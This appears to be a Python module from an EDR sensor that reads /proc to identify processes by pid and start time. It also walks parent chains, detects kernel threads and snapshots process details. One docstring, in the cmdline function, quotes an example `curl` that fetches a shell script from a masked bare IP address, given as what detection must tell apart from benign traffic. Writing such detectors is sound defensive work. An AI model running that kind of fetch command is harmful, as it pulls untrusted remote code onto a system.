"""/proc readers giving a stable process identity.

Pure functions, no BCC, no global state. **None of them raise**: a process that
vanishes between two reads is the normal case in /proc, not an error, and a
sensor thread must not die because of it.

The identity of a process is the pair `(pid, starttime)`, not the pid: the
kernel recycles pids, but starttime is immutable for the life of the process.
"""

import os

# A module variable rather than a literal so tests can point it at a synthetic
# tree. WSL2 exposes no kernel threads, so PF_KTHREAD cannot be reproduced
# against the real /proc of this machine.
PROC = "/proc"

# Fields of /proc/{pid}/stat, indexed AFTER the parenthesised comm. Official
# numbering starts at 1 for `pid`, so the index here is (field number - 3).
_STAT_STATE = 0       # field 3
_STAT_PPID = 1        # field 4
_STAT_FLAGS = 6       # field 9
_STAT_STARTTIME = 19  # field 22

# A kernel thread has no userspace: signalling it makes no sense.
PF_KTHREAD = 0x00200000

# /proc should not contain cycles, but an infinite loop inside the EDR would be
# worse than the bug it guards against.
_MAX_ANCESTRY_DEPTH = 64

# Computed rather than hardcoded: USER_HZ is not 100 on every kernel.
NS_PER_TICK = 1_000_000_000 // os.sysconf("SC_CLK_TCK")


def ns_to_ticks(ns):
    """Convert `task->start_boottime` into the units of /proc stat field 22.

    Same integer division the kernel does in `nsec_to_clock_t()`, so the result
    matches /proc to the tick.
    """
    if ns is None:
        return None
    return int(ns) // NS_PER_TICK


def read_stat(pid):
    """Return {comm, state, ppid, starttime, flags}, or None if unreadable.

    Splits on the LAST closing parenthesis: `comm` can contain spaces and
    parentheses, and a naive split shifts every later field, yielding a wrong
    starttime with no error at all.
    """
    try:
        with open(f"{PROC}/{pid}/stat", "rb") as f:
            raw = f.read().decode("utf-8", errors="replace")
    except (OSError, ValueError):
        return None

    open_paren = raw.find("(")
    close_paren = raw.rfind(")")
    if open_paren == -1 or close_paren == -1 or close_paren < open_paren:
        return None

    comm = raw[open_paren + 1:close_paren]
    rest = raw[close_paren + 1:].split()
    if len(rest) <= _STAT_STARTTIME:
        return None

    try:
        return {
            "comm": comm,
            "state": rest[_STAT_STATE],
            "ppid": int(rest[_STAT_PPID]),
            "flags": int(rest[_STAT_FLAGS]),
            "starttime": int(rest[_STAT_STARTTIME]),
        }
    except (ValueError, IndexError):
        return None


def starttime(pid):
    """Process start time in jiffies, or None if it does not exist."""
    stat = read_stat(pid)
    return stat["starttime"] if stat else None


def comm(pid):
    """Short process name, or None."""
    stat = read_stat(pid)
    return stat["comm"] if stat else None


def proc_key(pid):
    """Stable identity as a string: "4711:195964". None if the process is gone."""
    st = starttime(pid)
    return None if st is None else f"{pid}:{st}"


def is_alive(pid, expected_starttime):
    """True if the pid is still THE SAME process it was when captured.

    A None `expected_starttime` means identity was never captured, so it cannot
    be asserted: when in doubt, do not act.
    """
    if expected_starttime is None:
        return False
    return starttime(pid) == expected_starttime


def is_kernel_thread(pid):
    """True for a kernel thread.

    PF_KTHREAD is the authoritative signal; /proc/{pid}/exe is the fallback,
    since kernel threads have no executable to resolve.
    """
    stat = read_stat(pid)
    if stat is not None:
        return bool(stat["flags"] & PF_KTHREAD)
    try:
        os.readlink(f"{PROC}/{pid}/exe")
        return False
    except OSError:
        return True


def ancestors(pid):
    """Ancestor chain from the parent of `pid` up to pid 1.

    Used for self-protection: the MCP server is a child of the orchestrator, so
    walking the chain covers both with a single check.
    """
    chain = []
    seen = set()
    current = pid
    for _ in range(_MAX_ANCESTRY_DEPTH):
        stat = read_stat(current)
        if stat is None:
            break
        parent = stat["ppid"]
        if parent <= 0 or parent in seen:
            break
        chain.append(parent)
        seen.add(parent)
        if parent == 1:
            break
        current = parent
    return chain


def _read_uid(pid):
    """Real uid, from the `Uid:` line of /proc/{pid}/status."""
    try:
        with open(f"{PROC}/{pid}/status", "r") as f:
            for line in f:
                if line.startswith("Uid:"):
                    return int(line.split()[1])
    except (OSError, ValueError, IndexError):
        pass
    return None


def cmdline(pid):
    """Full command line. /proc delivers it null-separated.

    It is what tells `curl https://api.company.com/health` apart from
    `curl -s http://45.33.x.x/x.sh`, identical as far as `comm` is concerned.
    """
    try:
        with open(f"{PROC}/{pid}/cmdline", "rb") as f:
            raw = f.read()
    except OSError:
        return None
    if not raw:
        return ""
    parts = raw.split(b"\x00")
    return " ".join(p.decode("utf-8", errors="replace") for p in parts if p)


def snapshot(pid):
    """Point-in-time portrait of a process, or None if it is gone.

    `exe_deleted` is free to detect — the kernel appends " (deleted)" to the
    link itself — and a deleted executable still running is a classic signal.
    """
    stat = read_stat(pid)
    if stat is None:
        return None

    try:
        exe = os.readlink(f"{PROC}/{pid}/exe")
    except OSError:
        exe = None

    try:
        cwd = os.readlink(f"{PROC}/{pid}/cwd")
    except OSError:
        cwd = None

    return {
        "pid": pid,
        "comm": stat["comm"],
        "ppid": stat["ppid"],
        "state": stat["state"],
        "starttime": stat["starttime"],
        "proc_key": f"{pid}:{stat['starttime']}",
        "uid": _read_uid(pid),
        "exe": exe,
        "exe_deleted": bool(exe and exe.endswith(" (deleted)")),
        "cmdline": cmdline(pid),
        "cwd": cwd,
        "kernel_thread": bool(stat["flags"] & PF_KTHREAD),
    }
